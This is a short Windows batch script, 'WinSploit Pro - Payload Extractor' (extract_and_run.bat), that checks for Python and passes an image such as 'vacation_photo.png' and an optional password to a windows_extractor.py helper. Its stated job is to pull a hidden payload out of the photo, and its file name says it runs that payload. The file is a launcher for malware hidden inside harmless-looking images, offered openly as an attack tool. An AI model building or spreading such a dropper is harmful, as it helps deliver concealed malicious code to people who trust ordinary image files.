@echo off
echo ============================================
echo WinSploit Pro - Payload Extractor
echo ============================================
echo.

REM Check if Python is available
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python not found on this system
    echo [!] Please install Python or use the manual extraction method
    pause
    exit /b 1
)

REM Check if image file is provided
if "%1"=="" (
    echo Usage: extract_and_run.bat ^<image_file^> [password]
    echo Example: extract_and_run.bat vacation_photo.png
    echo Example: extract_and_run.bat vacation_photo.png mypassword
    pause
    exit /b 1
)

REM Check if image file exists
if not exist "%1" (
    echo [!] Image file not found: %1
    pause
    exit /b 1
)

echo [*] Extracting payload from: %1
if not "%2"=="" (
    echo [*] Using password for decryption
    python windows_extractor.py "%1" "%2"
) else (
    python windows_extractor.py "%1"
)

pause
